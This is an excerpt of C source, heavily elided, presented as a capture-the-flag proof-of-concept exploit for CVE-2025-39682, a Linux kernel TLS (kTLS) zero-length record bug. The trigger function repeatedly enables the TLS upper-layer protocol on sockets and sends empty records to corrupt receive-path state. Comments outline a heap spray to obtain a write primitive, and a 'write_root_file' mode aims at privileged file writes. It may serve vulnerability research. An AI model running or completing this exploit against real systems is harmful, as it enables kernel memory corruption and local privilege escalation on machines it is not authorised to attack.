/*
 * CVE-2025-39682 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS zero-length record processing error
 *
 * When kTLS receives a zero-length TLS record, the decryption path
 * mishandles the empty buffer, leading to an out-of-bounds access
 * or state corruption in the TLS receive context.
 *
 * Exploitation: Send crafted zero-length TLS records to trigger
 * state corruption in kTLS RX path, spray heap for write primitive.
 *
...
/*
 * Trigger TLS zero-length record corruption
 */
static int trigger_tls_zerolen(void) {
    int uaf_count = 0;
    ...
    poc_log_syscall("listen(srv) for TLS zerolen", 0L, 0);
    ...
    for (int i = 0; i < ITERATIONS; i++) {
        ...
        if (setsockopt(cfd, SOL_TCP, TCP_ULP, "tls", 3) == 0) {
            ...
            if (setsockopt(cfd, SOL_TLS, TLS_TX, &ci, sizeof(ci)) == 0) {
                /* Send zero-length data to trigger the bug in RX path */
                /* The TLS record layer sends a 0-byte application data record */
                send(cfd, "", 0, MSG_DONTWAIT);
                /* Also send a tiny record followed by close */
                char tiny[] = "";
                send(cfd, tiny, 0, 0);
                uaf_count++;
                poc_log("TLS zero-length record sent (iteration %d)", i);
            }
        }
    ...
    close(srv);
    poc_log("TLS zero-length record: %d triggers", uaf_count);
    return uaf_count;
}
...
static int mode_write_root_file(poc_args_t *args) {
    ...
    poc_print_fail("TLS zerolen exploit did not achieve write");
    return 0;
}
...
int main(int argc, char *argv[]) {
    ...
    poc_log("=== CVE-2025-39682 CTF PoC ===");
    poc_log("Vuln: TLS zero-length record processing state corruption");
